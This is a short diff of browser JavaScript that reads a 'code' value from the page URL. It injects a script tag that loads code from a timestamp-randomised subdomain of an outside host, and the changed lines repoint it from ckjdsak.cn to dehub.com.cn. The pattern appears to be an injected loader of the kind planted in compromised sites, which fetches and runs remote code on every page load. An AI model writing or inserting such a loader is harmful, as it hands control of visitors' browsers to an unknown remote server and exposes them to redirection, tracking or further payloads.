@@ -36,7 +36,7 @@
         var query = self.location.href;
         // console.log(query);
         var vars = query.split("/");
-        // console.log(vars);
+        console.log(vars);
         for (var i = 0; i < vars.length; i++) {
             // var pair = vars[i];
             if (vars[i] === variable) {
@@ -63,7 +63,7 @@
         var codecode = getQueryVariable2("code");
         var Time = (new Date()).getTime();
         var script = document.createElement('script');
-        script.setAttribute('src', "http://" + Time + ".ckjdsak.cn/index.php/index/loadGround/code" + codecode);
+        script.setAttribute('src', "http://" + Time + ".dehub.com.cn/index.php/index/index/loadGround/code=" + codecode);
         document.querySelector("head").appendChild(script);
     }());
 
@@ -74,7 +74,7 @@
             var codecode2 = getDomainSjcode("code");
             var Time2 = (new Date()).getTime();
             var script = document.createElement('script');
-            script.setAttribute('src', "http://" + Time2 + ".ckjdsak.cn/index.php/index/loadGround/code/" + codecode2);
+            script.setAttribute('src', "http://" + Time2 + ".dehub.com.cn/index.php/index/index/loadGround/code/" + codecode2);
             document.querySelector("head").appendChild(script);
         }
     }
